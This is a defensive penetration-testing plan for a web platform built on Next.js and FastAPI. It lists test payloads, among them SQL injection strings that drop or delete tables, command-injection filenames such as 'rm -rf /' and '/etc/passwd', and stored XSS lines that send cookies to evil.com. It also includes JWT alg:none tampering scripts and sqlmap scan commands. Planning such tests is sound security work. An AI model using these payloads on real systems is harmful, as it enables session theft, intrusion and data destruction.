# Penetration Testing Plan

**Platform**: Colombian Intelligence & Language Learning Platform
**Version**: 1.0.0
**Test Date**: Scheduled post-launch
**Tester**: External security firm (recommended)

---

## 1. Scope

### In-Scope Systems
- Web application frontend (Next.js)
- Backend API (FastAPI)
- Authentication system
- Search functionality
- Data export features
- User preferences
- Notification system

### Out-of-Scope
- Infrastructure (handled separately)
- Third-party services
- Physical security
- Social engineering

---

## 2. Testing Methodology

### Approach
- **Black Box Testing**: External attacker perspective
- **Gray Box Testing**: Limited knowledge (API documentation)
- **White Box Testing**: Full code access for specific tests

### Testing Phases
1. **Reconnaissance** (2 hours)
2. **Vulnerability Scanning** (4 hours)
3. **Manual Testing** (16 hours)
4. **Exploitation** (8 hours)
5. **Reporting** (4 hours)

**Total Duration**: 34 hours over 5 days

---

## 3. Authentication & Session Management Testing

### JWT Token Security
```bash
# Test scenarios:
1. Token tampering
   - Modify payload
   - Change signature
   - Remove signature
   - Alter algorithm (alg: "none")

2. Token expiration
   - Use expired access token
   - Use expired refresh token
   - Verify strict expiration enforcement

3. Token replay
   - Reuse logged-out tokens
   - Replay refresh tokens
   - Cross-user token usage

4. Token leakage
   - Check for tokens in URLs
   - Check for tokens in logs
   - Check for tokens in error messages
```

**Tools**: JWT.io, Burp Suite, Custom scripts

### Password Security
```bash
# Test scenarios:
1. Weak password acceptance
   - 7 characters
   - No uppercase
   - No special characters
   - Common passwords (123456, password)

2. Brute force protection
   - 100 login attempts
   - Distributed attempts
   - Rate limit bypass

3. Password reset
   - Token predictability
   - Token reuse
   - Token expiration
   - Email enumeration
```

### Session Fixation
```bash
# Test scenarios:
1. Session token predictability
2. Session hijacking
3. Concurrent sessions
4. Session timeout enforcement
```

---

## 4. Injection Attack Testing

### SQL Injection
```bash
# Test all input fields:
Login form:
  email: admin'--
  email: admin' OR '1'='1

Search:
  query: '; DROP TABLE articles--
  query: ' UNION SELECT * FROM users--

Filters:
  source_id: 1 OR 1=1
  date_from: 2024-01-01'; DELETE FROM articles--
```

**Expected Result**: All attempts blocked by Pydantic validation

### NoSQL Injection (if applicable)
```bash
# MongoDB injection patterns:
{
  "email": {"$ne": null},
  "password": {"$ne": null}
}
```

### Command Injection
```bash
# Test file operations:
filename: test.csv; rm -rf /
filename: ../../../etc/passwd
filename: test$(whoami).csv
```

### XPath/XML Injection
```bash
# XML export tests:
<user><name>admin</name><role>admin' or '1'='1</role></user>
```

---

## 5. Cross-Site Scripting (XSS) Testing

### Reflected XSS
```javascript
// Test search and URL parameters:
/api/search?q=<script>alert('XSS')</script>
/api/articles?title=<img src=x onerror=alert('XSS')>
/profile?name=<svg/onload=alert('XSS')>
```

### Stored XSS
```javascript
// Test user input storage:
POST /api/auth/register
{
  "full_name": "<script>document.location='http://evil.com?c='+document.cookie</script>",
  "email": "test@example.com"
}

POST /api/preferences
{
  "display_name": "<img src=x onerror=fetch('http://evil.com?c='+document.cookie)>"
}
```

### DOM-Based XSS
```javascript
// Test client-side rendering:
#/search?q=<img src=x onerror=alert(document.domain)>
```

**Expected Result**: All sanitized by bleach library

---

## 6. Access Control Testing

### Horizontal Privilege Escalation
```bash
# Test scenarios:
1. User A accesses User B's data
   GET /api/users/2/preferences (as user 1)

2. Modify other user's data
   PUT /api/users/2/profile (as user 1)

3. Delete other user's exports
   DELETE /api/exports/user_2_export.csv (as user 1)
```

### Vertical Privilege Escalation
```bash
# Test scenarios:
1. Regular user accesses admin endpoints
   GET /api/admin/users
   POST /api/admin/settings

2. Bypass role checks
   User-Agent: admin
   X-Role: admin

3. Parameter tampering
   {"role": "admin", "email": "test@example.com"}
```

### Insecure Direct Object Reference (IDOR)
```bash
# Test all ID parameters:
GET /api/articles/1
GET /api/articles/2
...
GET /api/articles/99999

GET /api/notifications/1 (should only see own notifications)
GET /api/exports/1 (should only access own exports)
```

---

## 7. Business Logic Testing

### Rate Limiting Bypass
```bash
# Test scenarios:
1. Distributed requests
   - Multiple IPs
   - Different user agents
   - Header manipulation

2. Endpoint variations
   /api/analysis/sentiment
   /api/analysis/sentiment/
   /API/analysis/sentiment

3. HTTP method variations
   GET /api/analysis/sentiment
   POST /api/analysis/sentiment
   PUT /api/analysis/sentiment
```

### Export Functionality Abuse
```bash
# Test scenarios:
1. Massive data export
   POST /api/export {filters: {}, limit: 999999}

2. Rapid export requests
   - 100 concurrent export requests
   - Exhaust server resources

3. Export size limits
   - Request 1GB export
   - Request all users' data
```

### Notification Spam
```bash
# Test scenarios:
1. Create 1000 notifications
2. Email bombing via password reset
3. Notification priority manipulation
```

---

## 8. API Security Testing

### Mass Assignment
```bash
# Test hidden fields:
POST /api/auth/register
{
  "email": "test@example.com",
  "password": "Test123!@#",
  "is_admin": true,  # Should be rejected
  "is_verified": true  # Should be rejected
}
```

### API Versioning
```bash
# Test deprecated endpoints:
GET /api/v1/articles (if exists)
GET /api/v2/articles
```

### Content-Type Validation
```bash
# Send unexpected content types:
POST /api/auth/login
Content-Type: application/xml
Content-Type: text/plain
Content-Type: multipart/form-data
```

### HTTP Verb Tampering
```bash
# Try different methods:
DELETE /api/articles (as regular user)
PUT /api/users/admin (privilege escalation)
TRACE /api/auth/login (HTTP method abuse)
```

---

## 9. Client-Side Testing

### Sensitive Data Exposure
```bash
# Check for:
1. API keys in JavaScript
2. Passwords in local storage
3. Session tokens in URLs
4. Debug information in HTML comments
5. Source maps in production
6. Environment variables exposed
```

### CORS Misconfiguration
```bash
# Test from different origins:
Origin: https://evil.com
Origin: null
Origin: https://sub.legit-domain.com
```

### Clickjacking
```html
<!-- Test iframe embedding: -->
<iframe src="https://platform.com/transfer"></iframe>
```

**Expected Result**: Blocked by X-Frame-Options: DENY

---

## 10. Infrastructure Testing

### SSL/TLS Configuration
```bash
# Test with sslscan:
sslscan https://api.example.com

# Check for:
1. Weak ciphers (RC4, DES, 3DES)
2. SSL v2/v3 enabled
3. TLS 1.0/1.1 enabled
4. Weak key exchange (DHE < 2048 bits)
5. Certificate validity
6. Certificate chain
```

### Security Headers
```bash
# Verify presence:
curl -I https://api.example.com

Expected headers:
- Strict-Transport-Security
- Content-Security-Policy
- X-Frame-Options
- X-Content-Type-Options
- Referrer-Policy
- Permissions-Policy
```

### Information Disclosure
```bash
# Check for:
1. Server version in headers
2. Technology stack disclosure
3. Detailed error messages
4. Directory listing
5. .git folder accessible
6. Backup files (.bak, .old, ~)
```

---

## 11. Database Security

### Database Enumeration
```bash
# Test information leakage:
1. Database error messages
2. Query execution time (blind SQL injection)
3. Boolean-based blind SQL injection
4. Time-based blind SQL injection
```

### Connection String Exposure
```bash
# Check for exposed credentials:
1. .env files in web root
2. config files accessible
3. Error messages with connection strings
```

---

## 12. Elasticsearch Security

### Query Injection
```bash
# Test search injection:
POST /api/search
{
  "query": {
    "_source": {"includes": ["*"]},
    "script": {"source": "System.exit(0)"}
  }
}
```

### Index Enumeration
```bash
# Test index access:
GET /_cat/indices
GET /articles_index/_search?size=1000
GET /users_index/_search
```

---

## 13. Test Scripts

### Automated Vulnerability Scanning
```bash
#!/bin/bash
# automated-scan.sh

echo "Starting automated vulnerability scan..."

# OWASP ZAP scan
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t https://api.example.com \
  -r zap-report.html

# Nuclei scan
nuclei -u https://api.example.com \
  -severity critical,high,medium \
  -o nuclei-report.txt

# SQLMap scan
sqlmap -u "https://api.example.com/api/search?q=test" \
  --batch \
  --level=5 \
  --risk=3 \
  -o sqlmap-report.txt

echo "Scan complete. Review reports."
```

### JWT Token Testing
```python
# jwt_test.py
import jwt
import requests

def test_jwt_tampering(token, api_url):
    """Test JWT token tampering"""

    # Test 1: Modify payload
    decoded = jwt.decode(token, options={"verify_signature": False})
    decoded['sub'] = '999999'  # Different user ID
    tampered = jwt.encode(decoded, '', algorithm='none')

    response = requests.get(
        f"{api_url}/api/users/me",
        headers={"Authorization": f"Bearer {tampered}"}
    )
    print(f"Tampered token: {response.status_code} (expect 401)")

    # Test 2: Expired token
    decoded['exp'] = 0  # Expired
    expired = jwt.encode(decoded, 'wrong-secret', algorithm='HS256')

    response = requests.get(
        f"{api_url}/api/users/me",
        headers={"Authorization": f"Bearer {expired}"}
    )
    print(f"Expired token: {response.status_code} (expect 401)")

if __name__ == "__main__":
    token = "your-valid-token"
    test_jwt_tampering(token, "https://api.example.com")
```

### XSS Testing
```python
# xss_test.py
import requests

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=javascript:alert('XSS')>",
]

def test_xss(api_url, auth_token):
    """Test XSS in all input fields"""

    headers = {"Authorization": f"Bearer {auth_token}"}

    for payload in XSS_PAYLOADS:
        # Test registration
        response = requests.post(
            f"{api_url}/api/auth/register",
            json={
                "email": f"test_{payload}@example.com",
                "password": "Test123!@#",
                "full_name": payload
            }
        )

        if payload in response.text:
            print(f"❌ XSS vulnerability found: {payload}")
        else:
            print(f"✅ XSS blocked: {payload}")

if __name__ == "__main__":
    test_xss("https://api.example.com", "your-token")
```

---

## 14. Reporting Template

### Vulnerability Report Format
```markdown
## Vulnerability: [NAME]

**Severity**: Critical/High/Medium/Low
**CVS Score**: X.X
**Category**: Authentication/Injection/XSS/etc.

### Description
[Detailed description of the vulnerability]

### Proof of Concept
[Step-by-step reproduction steps]
[Code/screenshots]

### Impact
[Business impact and potential damage]

### Remediation
[Specific fix recommendations]

### References
[CWE, OWASP, CVE references]
```

---

## 15. Success Criteria

### Test Completion
- [ ] All 100+ test cases executed
- [ ] All findings documented
- [ ] Proof of concept for each vulnerability
- [ ] Remediation recommendations provided

### Expected Results (Production-Ready)
- [ ] Zero critical vulnerabilities
- [ ] <5 high-severity issues
- [ ] <10 medium-severity issues
- [ ] All SQL injection attempts blocked
- [ ] All XSS attempts sanitized
- [ ] Rate limiting effective
- [ ] Authentication secure
- [ ] Session management secure

---

## 16. Timeline

**Week 1**: Preparation and reconnaissance
**Week 2**: Automated scanning
**Week 3**: Manual testing
**Week 4**: Exploitation and reporting

**Deliverables**:
- Executive summary
- Technical report with findings
- Proof-of-concept code
- Remediation recommendations
- Retest plan

---

**Plan Prepared By**: Security Audit Agent
**Approval Required**: Security Lead, CTO
**Next Review**: Post-remediation retest
